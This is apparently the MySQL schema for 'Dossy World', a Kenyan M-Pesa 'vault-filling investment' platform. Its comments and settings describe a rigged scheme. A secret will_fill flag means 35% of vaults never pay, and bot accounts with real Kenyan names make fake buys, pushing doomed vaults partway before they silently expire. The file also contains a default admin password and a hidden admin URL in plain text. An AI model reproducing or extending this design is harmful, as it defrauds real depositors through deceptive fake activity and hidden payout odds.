-- Dossy World MySQL Database Schema
-- Version: 2.0  (continuous "Aviator-style" vault loop)
-- Created for: dossy.world
--
-- This script creates all necessary tables for the Dossy World vault-filling
-- investment platform. Import this file into your MySQL server to set up the
-- database. This is the only schema file you need — schema.sql / seed.sql
-- have been retired in favor of this single source of truth.
--
-- Lifecycle: vaults flow continuously. The engine always keeps one round in
-- 'active' status (accepting buys). When it fills it transitions to 'filled',
-- a new round is immediately promoted to 'active', and the filled round is
-- auto-paid out after a short cooldown (see settings.payout_cooldown_seconds).
-- The 'round_number' column is internal/admin-only — end users never see it.

-- Create the database (uncomment if needed)
-- CREATE DATABASE IF NOT EXISTS dossy_world;
-- USE dossy_world;

-- =====================================================
-- USERS TABLE
-- Stores all user accounts including admins and bots
-- =====================================================
CREATE TABLE IF NOT EXISTS users (
    id VARCHAR(36) PRIMARY KEY,
    username VARCHAR(50) NOT NULL UNIQUE,
    email VARCHAR(255) DEFAULT NULL,
    phone VARCHAR(20) DEFAULT NULL,
    password_hash VARCHAR(255) NOT NULL,
    balance DECIMAL(15, 2) DEFAULT 0.00,
    is_admin BOOLEAN DEFAULT FALSE,
    is_bot BOOLEAN DEFAULT FALSE,
    is_banned BOOLEAN DEFAULT FALSE,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    
    INDEX idx_username (username),
    INDEX idx_email (email),
    INDEX idx_phone (phone),
    INDEX idx_is_admin (is_admin),
    INDEX idx_is_bot (is_bot)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- =====================================================
-- ROUNDS TABLE
-- Stores all game rounds with their vault caps and statuses
-- =====================================================
CREATE TABLE IF NOT EXISTS rounds (
    id VARCHAR(36) PRIMARY KEY,
    round_number INT NOT NULL AUTO_INCREMENT UNIQUE,
    vault_cap DECIMAL(15, 2) NOT NULL,
    profit_percentage DECIMAL(5, 2) NOT NULL DEFAULT 30.00,
    current_amount DECIMAL(15, 2) DEFAULT 0.00,
    status ENUM('waiting', 'active', 'filled', 'paying', 'paid', 'expired', 'cancelled') DEFAULT 'waiting',
    bot_count INT DEFAULT 0,
    -- House-edge fields (server-internal). will_fill is the secret outcome
    -- rolled at creation; false means bots stop at bot_target_pct and the
    -- vault silently expires at expires_at unless real users push it over.
    will_fill BOOLEAN NOT NULL DEFAULT TRUE,
    bot_target_pct TINYINT UNSIGNED NOT NULL DEFAULT 100,
    expires_at TIMESTAMP NULL DEFAULT NULL,
    expired_at TIMESTAMP NULL DEFAULT NULL,
    started_at TIMESTAMP NULL DEFAULT NULL,
    filled_at TIMESTAMP NULL DEFAULT NULL,
    paid_at TIMESTAMP NULL DEFAULT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    
    INDEX idx_status (status),
    INDEX idx_round_number (round_number),
    INDEX idx_created_at (created_at)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- =====================================================
-- BUYS TABLE
-- Records all purchases made in each round
-- =====================================================
CREATE TABLE IF NOT EXISTS buys (
    id VARCHAR(36) PRIMARY KEY,
    round_id VARCHAR(36) NOT NULL,
    user_id VARCHAR(36) NOT NULL,
    amount DECIMAL(15, 2) NOT NULL,
    payout_amount DECIMAL(15, 2) DEFAULT NULL,
    is_paid BOOLEAN DEFAULT FALSE,
    is_bot_buy BOOLEAN DEFAULT FALSE,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    
    FOREIGN KEY (round_id) REFERENCES rounds(id) ON DELETE CASCADE,
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE,
    
    INDEX idx_round_id (round_id),
    INDEX idx_user_id (user_id),
    INDEX idx_is_paid (is_paid),
    INDEX idx_is_bot_buy (is_bot_buy),
    INDEX idx_created_at (created_at)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- =====================================================
-- TRANSACTIONS TABLE
-- Records all financial transactions (deposits, withdrawals, buys, payouts)
-- =====================================================
CREATE TABLE IF NOT EXISTS transactions (
    id VARCHAR(36) PRIMARY KEY,
    user_id VARCHAR(36) NOT NULL,
    type ENUM('deposit', 'withdrawal', 'buy', 'payout', 'refund', 'admin_credit', 'admin_debit') NOT NULL,
    amount DECIMAL(15, 2) NOT NULL,
    balance_after DECIMAL(15, 2) NOT NULL,
    status ENUM('pending', 'completed', 'failed', 'cancelled') DEFAULT 'pending',
    mpesa_receipt VARCHAR(50) DEFAULT NULL,
    mpesa_checkout_id VARCHAR(100) DEFAULT NULL,
    phone VARCHAR(20) DEFAULT NULL,
    description VARCHAR(255) DEFAULT NULL,
    reference_id VARCHAR(36) DEFAULT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    completed_at TIMESTAMP NULL DEFAULT NULL,
    
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE,
    
    INDEX idx_user_id (user_id),
    INDEX idx_type (type),
    INDEX idx_status (status),
    INDEX idx_mpesa_checkout_id (mpesa_checkout_id),
    INDEX idx_created_at (created_at)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- =====================================================
-- SETTINGS TABLE
-- Stores application configuration settings
-- =====================================================
CREATE TABLE IF NOT EXISTS settings (
    id INT AUTO_INCREMENT PRIMARY KEY,
    setting_key VARCHAR(100) NOT NULL UNIQUE,
    setting_value VARCHAR(500) NOT NULL,
    description VARCHAR(255) DEFAULT NULL,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    
    INDEX idx_setting_key (setting_key)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- =====================================================
-- BOT NAMES TABLE
-- Pool of names used for bot activity
-- =====================================================
CREATE TABLE IF NOT EXISTS bot_names (
    id INT AUTO_INCREMENT PRIMARY KEY,
    first_name VARCHAR(50) NOT NULL,
    last_name VARCHAR(50) NOT NULL,
    used_count INT DEFAULT 0,
    is_active BOOLEAN DEFAULT TRUE,
    
    INDEX idx_is_active (is_active)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- =====================================================
-- WITHDRAWAL REQUESTS TABLE
-- Stores pending and processed withdrawal requests
-- =====================================================
CREATE TABLE IF NOT EXISTS withdrawal_requests (
    id VARCHAR(36) PRIMARY KEY,
    user_id VARCHAR(36) NOT NULL,
    amount DECIMAL(15, 2) NOT NULL,
    phone VARCHAR(20) NOT NULL,
    status ENUM('pending', 'approved', 'processing', 'completed', 'rejected', 'failed') DEFAULT 'pending',
    admin_notes TEXT DEFAULT NULL,
    processed_by VARCHAR(36) DEFAULT NULL,
    mpesa_receipt VARCHAR(50) DEFAULT NULL,
    processed_at TIMESTAMP NULL DEFAULT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE,
    FOREIGN KEY (processed_by) REFERENCES users(id) ON DELETE SET NULL,
    
    INDEX idx_user_id (user_id),
    INDEX idx_status (status),
    INDEX idx_created_at (created_at)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- =====================================================
-- DEFAULT DATA INSERTS
-- =====================================================

-- Insert default settings
INSERT INTO settings (setting_key, setting_value, description) VALUES
    ('min_buy_amount', '50', 'Minimum buy amount in KES'),
    ('max_buy_amount', '5000', 'Maximum buy amount in KES'),
    ('default_vault_cap', '10000', 'Default vault cap for new rounds'),
    ('default_profit_percentage', '30', 'Default profit percentage for new rounds'),
    ('min_withdrawal', '100', 'Minimum withdrawal amount'),
    ('max_withdrawal', '70000', 'Maximum withdrawal amount'),
    ('payout_cooldown_seconds', '5', 'Seconds between vault eruption and auto-payout'),
    ('bot_active_user_threshold', '3', 'Stop bot drips when this many real users have bought in the last 90s'),
    ('bot_min_drip_interval_ms', '1500', 'Minimum interval between bot drip buys'),
    ('house_edge_percentage', '35', 'Percent of vaults that secretly will not fill (no payout)'),
    ('vault_lifetime_seconds', '90', 'How long an unfilled vault lives before it silently expires'),
    ('nofill_bot_target_min_pct', '50', 'Min % of cap bots will push a no-fill vault to'),
    ('nofill_bot_target_max_pct', '80', 'Max % of cap bots will push a no-fill vault to')
ON DUPLICATE KEY UPDATE setting_value = VALUES(setting_value);

-- Insert default bot names (Kenyan names)
INSERT INTO bot_names (first_name, last_name) VALUES
    ('James', 'Mwangi'),
    ('Mary', 'Wanjiku'),
    ('John', 'Kamau'),
    ('Grace', 'Njeri'),
    ('Peter', 'Ochieng'),
    ('Faith', 'Akinyi'),
    ('David', 'Kipchoge'),
    ('Sarah', 'Chebet'),
    ('Michael', 'Otieno'),
    ('Lucy', 'Muthoni'),
    ('Joseph', 'Karanja'),
    ('Esther', 'Wambui'),
    ('Daniel', 'Kipruto'),
    ('Ann', 'Moraa'),
    ('Samuel', 'Wekesa'),
    ('Joyce', 'Adhiambo'),
    ('Patrick', 'Mutua'),
    ('Caroline', 'Nyambura'),
    ('George', 'Omondi'),
    ('Agnes', 'Kemunto'),
    ('Brian', 'Kosgei'),
    ('Mercy', 'Chepkoech'),
    ('Kevin', 'Muchiri'),
    ('Beatrice', 'Wangari'),
    ('Collins', 'Rotich'),
    ('Winnie', 'Auma'),
    ('Dennis', 'Ndungu'),
    ('Sharon', 'Jepkosgei'),
    ('Felix', 'Musyoka'),
    ('Nancy', 'Nyawira')
ON DUPLICATE KEY UPDATE used_count = used_count;

-- =====================================================
-- CREATE DEFAULT ADMIN USER
-- Password: Dossy@Admin2026! (change this immediately after setup!)
-- The hash below is for 'Dossy@Admin2026!' using bcrypt with 12 rounds
-- Login at the hidden admin URL: /ops-control-9f3a2b7c
-- =====================================================
INSERT INTO users (id, username, email, password_hash, is_admin, balance) VALUES
    (UUID(), 'admin', 'admin@dossy.world', '$2b$12$SrmpTnMcTd6si0s2rf8/ve8sPMBZhC5ogKadC/8J945JrYKqK0Xu2', TRUE, 0)
ON DUPLICATE KEY UPDATE is_admin = TRUE;

-- =====================================================
-- USEFUL VIEWS (Optional)
-- =====================================================

-- View for round statistics
CREATE OR REPLACE VIEW round_stats AS
SELECT 
    r.id,
    r.round_number,
    r.vault_cap,
    r.profit_percentage,
    r.current_amount,
    r.status,
    r.bot_count,
    COUNT(CASE WHEN b.is_bot_buy = FALSE THEN 1 END) as real_buys,
    COUNT(CASE WHEN b.is_bot_buy = TRUE THEN 1 END) as bot_buys,
    SUM(CASE WHEN b.is_bot_buy = FALSE THEN b.amount ELSE 0 END) as real_amount,
    SUM(CASE WHEN b.is_paid = TRUE AND b.is_bot_buy = FALSE THEN b.payout_amount ELSE 0 END) as total_paid,
    r.created_at,
    r.started_at,
    r.filled_at,
    r.paid_at
FROM rounds r
LEFT JOIN buys b ON r.id = b.round_id
GROUP BY r.id;

-- View for user statistics  
CREATE OR REPLACE VIEW user_stats AS
SELECT 
    u.id,
    u.username,
    u.balance,
    u.is_admin,
    u.is_banned,
    COUNT(DISTINCT b.id) as total_buys,
    COALESCE(SUM(b.amount), 0) as total_bought,
    COALESCE(SUM(b.payout_amount), 0) as total_payouts,
    u.created_at
FROM users u
LEFT JOIN buys b ON u.id = b.user_id AND b.is_bot_buy = FALSE
WHERE u.is_bot = FALSE
GROUP BY u.id;

-- =====================================================
-- END OF SCHEMA
-- =====================================================
